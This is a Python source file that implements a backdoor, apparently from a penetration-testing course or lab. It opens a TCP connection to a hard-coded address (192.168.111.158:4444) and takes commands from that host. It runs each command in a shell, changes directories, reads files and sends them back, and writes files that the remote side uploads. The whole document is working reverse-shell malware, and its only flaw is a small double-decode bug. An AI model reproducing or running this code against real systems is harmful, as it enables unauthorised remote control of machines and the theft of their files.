#!/usr/bin/env python
import base64
import socket
import subprocess
import json
import os
class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True).decode('cp949')

    def change_working_directory_to(self, path) :
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def reliable_send(self,command) :
        # Changed data type from traditional types to JSON types
        json_data = json.dumps(command)
        self.connection.send(json_data.encode('cp949'))

    def reliable_receive(self) :
        json_data = b""
        while True :
            try :
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue

    def write_file(self,path,text) :
        with open(path,"wb") as file :
            file.write(base64.b64decode(text))
            return "[+] Upload successful."
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    def run(self):
        while True :
            command = self.reliable_receive()
            try:
                if command[0].lower() == "exit" :
                    self.connection.close()
                    exit()
                elif command[0].lower() == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0].lower() == "download" :
                    command_result = self.read_file(command[1]).decode('cp949')
                elif command[0].lower() == "upload" :
                    command_result = self.write_file(command[1],command[2])
                else :
                    command_result = self.execute_system_command(command).decode('cp949')
            except Exception :
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
